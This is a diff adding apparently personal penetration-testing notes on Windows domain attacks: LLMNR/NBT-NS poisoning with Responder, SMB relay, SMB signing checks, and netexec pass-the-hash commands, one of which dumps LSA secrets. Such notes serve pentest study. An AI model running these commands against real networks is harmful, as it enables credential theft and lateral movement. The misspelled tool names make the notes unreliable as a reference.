@@ -1,3 +1,20 @@
+#LLMNR Posioning - (LLMNR/NBTNS/MDNS) -capture hashes and crack  (Responder)(john,hashcat) --As much you want (domain) 
+#SMB Relay - NTLM crack(account access), smb share folder(files access), smb shares access(system access) (Responder,smbrelayx,crackmapsec-ntlmralyx)(john,hashcat)(smbclient,smbmap)(nc)
+
+SMB Relay - Vulnerbality 
+SMBv1, SMBv1.1 
+
+Authentication - 
+Smb signing enabled but not required (*)
+smb disabled 
+
+Methods
+crackmapexec smb submnet(IPs-) file-Ips
+nmap --script smb-security-mode IPs
+
+
+Pass the hash - Local Admin hash - crack- domain access/login(SAM hashes), Pass - lateral movement (Responder,crackmapsec-ntlmralyx)
+
 #Pass The Hash Attack 
 netexec smb IP -u Administrator -H HASH --localauth 
 netexec smb IP -u Administrator -H HASH --localauth --lsa 
